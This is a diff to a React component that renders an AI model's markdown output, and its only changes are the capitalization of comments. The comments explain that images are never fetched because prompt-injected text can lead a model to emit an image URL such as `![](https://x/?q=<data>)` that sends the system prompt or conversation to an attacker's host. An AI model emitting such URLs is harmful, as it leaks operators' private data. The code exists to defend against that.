@@ -1,5 +1,5 @@
 // GFM markdown + syntax highlight: react-markdown (does NOT render HTML → XSS-safe) +
-// Remark-gfm (tables/strikethrough/task lists) + rehype-highlight (hljs classes).
+// remark-gfm (tables/strikethrough/task lists) + rehype-highlight (hljs classes).
 // Visual language: Local Influence — code is JetBrains Mono, tables use the card surface, links use brand.
 import { isValidElement, useState, type ReactNode } from 'react';
 import ReactMarkdown from 'react-markdown';
@@ -14,7 +14,7 @@ import './markdown.css';
 function Pre({ children }: { children?: ReactNode }) {
   const { t } = useTranslation('common');
   // Bug-investigation fix #7: 'idle'/'done'/'error' — doesn't unconditionally show "success"
-  // Without waiting for the clipboard-write RESULT (inside .then()); failure becomes visible in .catch().
+  // without waiting for the clipboard-write RESULT (inside .then()); failure becomes visible in .catch().
   const [state, setState] = useState<'idle' | 'done' | 'error'>('idle');
   // <pre><code class="hljs language-ts">…</code></pre> — extract the language tag from the class.
   const codeEl = isValidElement(children) ? (children as any) : null;
@@ -58,7 +58,7 @@ function extractText(node: ReactNode): string {
 
 /**
  * Chat/markdown body. HTML input is not rendered (react-markdown's default) — raw HTML in the
- * Model's output stays as harmless text. Links open in a new tab, http(s)/mailto only.
+ * model's output stays as harmless text. Links open in a new tab, http(s)/mailto only.
  */
 export function Markdown({ text }: { text: string }) {
   return (
@@ -83,24 +83,24 @@ export function Markdown({ text }: { text: string }) {
           // A remote image is a request the operator never made, sent the moment the text renders.
           //
           // The text here is the MODEL's, and a model that has read a tool result, a document or a web
-          // Page has been handed text an attacker may have written. `![](https://x/?q=<data>)` then
-          // Becomes an exfiltration channel: what leaves is not the token — that never enters the DOM
+          // page has been handed text an attacker may have written. `![](https://x/?q=<data>)` then
+          // becomes an exfiltration channel: what leaves is not the token — that never enters the DOM
           // — but anything the model can put in a URL (system prompt, tool output, the conversation),
-          // Plus the operator's IP and the moment they opened the page.
+          // plus the operator's IP and the moment they opened the page.
           //
           // The link handler above already refuses unknown schemes, and this is the same class with
-          // The safety inverted: a link needs a click, an image needs nothing.
+          // the safety inverted: a link needs a click, an image needs nothing.
           //
           // NO image is rendered here, rather than "remote ones only". react-markdown's own url
-          // Sanitizer already strips `data:` before this component runs — measured, the src arrives as
+          // sanitizer already strips `data:` before this component runs — measured, the src arrives as
           // `''` — so a `data:image/…` branch would read as a live allowance while never firing once.
           // Everything that reaches this handler is http(s), and none of it should be fetched. The
-          // Address is still shown, so nothing is hidden from the operator.
+          // address is still shown, so nothing is hidden from the operator.
           img: ({ src, alt }) => {
             // `title` carries the address even when there is an alt to show, which is the common
-            // Case — `![chart](https://…)` rendered as just "chart" and the operator had no way to
-            // See where it pointed, let alone judge it. The chip is not an <a>: opening it is a
-            // Deliberate copy-paste, not a click that a hostile alt text could solicit.
+            // case — `![chart](https://…)` rendered as just "chart" and the operator had no way to
+            // see where it pointed, let alone judge it. The chip is not an <a>: opening it is a
+            // deliberate copy-paste, not a click that a hostile alt text could solicit.
             const address = typeof src === 'string' ? src : '';
             return (
               <span
